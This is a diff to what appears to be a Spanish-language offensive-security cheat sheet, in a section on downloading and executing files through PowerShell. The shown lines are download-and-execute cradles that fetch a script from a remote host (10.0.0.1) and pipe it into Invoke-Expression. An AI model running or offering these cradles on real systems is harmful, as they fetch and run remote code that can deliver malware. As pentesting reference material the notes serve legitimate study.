@@ -2655,16 +2655,12 @@ Existen multitud de técnicas para la descarga y ejecución de ficheros a travé
 Invoke-WebRequest (IWR) e Invoke-Expression (IEX)
 ```ps
 Invoke-WebRequest -Uri 'https://domain.com/myfile.ps1' -OutFile "C:\temp\myfile.ps1"
-
-IEX (New-Object Net.WebClient).DownloadString('URL')
-
+Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | Select-Object Content | IEX
 Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | IEX
 
-IEX (Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing)
-
-Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | Select-Object Content | IEX
-
 IEX (Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing).Content
+IEX (Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing)
+IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/sysinfo.txt')
 ```
 
 Invoke-RestMethod (IRM) e Invoke-Expression (IEX)
